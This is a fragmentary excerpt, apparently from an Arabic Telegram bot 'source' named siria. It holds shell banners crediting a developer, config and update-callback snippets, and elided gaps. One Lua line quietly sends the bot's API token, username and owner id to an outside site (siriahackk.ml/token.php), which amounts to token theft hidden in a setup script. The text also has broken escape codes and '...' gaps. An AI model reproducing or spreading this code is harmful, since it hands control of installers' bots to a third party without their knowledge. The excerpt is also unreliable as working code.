...
https.request('https://siriahackk.ml/token.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
...
echo -e "\e[38;5;77m       •{ •{ Join the Source Channel : @siria_TEAM_4 }• }•\e[0m"
...
echo -e "\e[38;5;77m       •{ developer JACK : @SIRIA199  }•\e[0m"

echo -e "\e[38;5;77m      siria ✾ @SIRIA199e[0m"
echo -e "\e[38;5;77m       ✾تم تطوير وبرمجة السورس من قبل جاك ✾ .e[0m"
echo -e "\e[38;5;77m       ✾ @SIRIA199e[0m"
-------------------------------------------------------------------
]]..'\027[0;32m')
create_config() 
else
...
echo -e "\e[38;5;77m     siria ✾ @SIRIA199e[0m"
echo -e "\e[38;5;77m     ✾تم تطوير وبرمجة السورس من قبل جاك ✾ .e[0m"
echo -e "\e[38;5;77m     ✾ @SIRIA199 e[0m"
-ـ-ـ-ـ-ـ-ــ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ--ـ-ـ-ـ-ـ
...
function tdcli_update_callback(data)
	...
	EditMsg(data.message_.chat_id_,data.message_.id_,'SOURCE siria\n\n• ** السورس الى اصدار \n• ** تم اعاده تشغيل سورس بلاك بنجاح')
	dofile("./inc/Run.lua")
